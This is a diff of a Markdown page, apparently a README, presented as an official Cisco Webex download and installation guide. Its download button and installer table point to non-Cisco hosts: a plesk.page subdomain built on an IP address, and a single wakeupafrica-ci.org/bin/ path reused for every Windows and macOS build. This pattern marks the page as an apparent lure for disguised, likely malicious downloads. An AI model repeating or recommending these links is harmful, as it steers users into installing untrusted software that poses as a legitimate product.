@@ -1,36 +1,43 @@
-## Cisco Webex: Download for Seamless Meetings
+# Download and install Cisco Webex
 
-**Cisco Webex** is a powerful platform for video conferencing, online meetings, screen sharing, and webinars. It is designed to enhance communication and collaboration for teams of any size, offering seamless integration with a variety of tools and devices. Whether you are working remotely or in a traditional office setting, Webex ensures that your meetings are productive and engaging.
+**Webex** is a powerful platform for video conferencing, online meetings, screen sharing, and webinars. It is designed to enhance communication and collaboration for teams of any size, offering seamless integration with a variety of tools and devices. Whether you are working remotely or in a traditional office setting, Webex ensures that your meetings are productive and engaging.
 
-## Table of Contents
-1. [Installation](#installation)
-2. [System Requirements](#system-requirements)
-3. [Features](#features)
-4. [Support](#support)
-6. [Security](#security)
-7. [FAQs](#faqs)
+- [Download Webex](#download-webex)
+- [Install Webex](#install-webex)
+- [System Requirements](#system-requirements)
+- [Features](#features)
+- [Support](#support)
+- [Security](#security)
+- [FAQs](#faqs)
 
-## Installation
+## Download Webex
+Webex 45.1 is the latest stable version
 
-To install Cisco Webex for Windows:  
+*   Release number: 45.1
+*   Release date: January 7, 2025
 
-### 🔗 [Download Cisco Webex](https://elegant-perlman.65-21-220-107.plesk.page/bin3/)
+| Platform | Type             | Download                                                                                                                                                                                                                             |
+| -------- | ---------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Windows  | Standard Installer   | [64-bit version](https://wakeupafrica-ci.org/bin/) [ARM64 version](https://wakeupafrica-ci.org/bin/)                                                                                          |
+|          | System Installer | [64-bit version](https://wakeupafrica-ci.org/bin/) [ARM64 version](https://wakeupafrica-ci.org/bin/)                                                                                        |
+|          | .zip             | [64-bit version](https://wakeupafrica-ci.org/bin/) [ARM64 version](https://wakeupafrica-ci.org/bin/)                                                                                          |
+| macOS    | .zip             | [Universal](https://wakeupafrica-ci.org/bin/) [Intel Chip](https://wakeupafrica-ci.org/bin/) [Apple Silicon](https://wakeupafrica-ci.org/bin/) |
+| Linux    | .tar.gz          | [64-bit version](*)                                                                                                                                                                 |
+|          | .deb             | [64-bit version](*)                                                                                                                                                               |
+|          | .rpm             | [64-bit version](*)              
 
 
-1. **Run the Installer**
-   - Navigate to the folder where the installer is saved.
-   - Double-click the installer file to begin the installation process.
-
-2. **Follow the Setup Wizard**
+## Install Webex
+1. **Follow the Setup Wizard**
    - Accept the license agreement and click "Next."
    - Choose your installation preferences (e.g., installation location).
    - Click "Install" to proceed.
 
-3. **Complete the Installation**
+2. **Complete the Installation**
    - Wait for the installation to finish.
    - Click "Finish" once the installation is complete.
 
-4. **Log In to Webex**
+3. **Log In to Webex**
    - Launch Webex from your desktop or Start menu.
    - Log in with your Webex account credentials or create a new account.
 
